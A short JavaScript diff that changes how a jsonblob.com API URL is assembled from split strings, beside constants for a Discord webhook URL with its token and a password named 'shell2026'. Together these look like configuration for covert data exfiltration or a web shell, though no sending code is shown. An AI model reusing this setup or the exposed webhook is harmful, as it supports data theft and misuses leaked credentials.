@@ -1,4 +1,4 @@
-const BLOB_URL = 'https:/' + '/://jsonblob.com' + '01a1efe3-e112-741f-9111-24955f15a4a3';
+const BLOB_URL = ['https:', '', 'jsonblob.com', 'api', 'jsonBlob', '01a1efe3-e112-741f-9111-24955f15a4a3'].join('/');
 const HOOK = 'https://discord.com/api/webhooks/1572641039817380003/RwLWlV8XtoHgsT0fKTR-lXcLOapczZ7DhpUCic-izRV8c0YnDING166mJvn6RITba-I6';
 
 const PASS = 'shell2026';
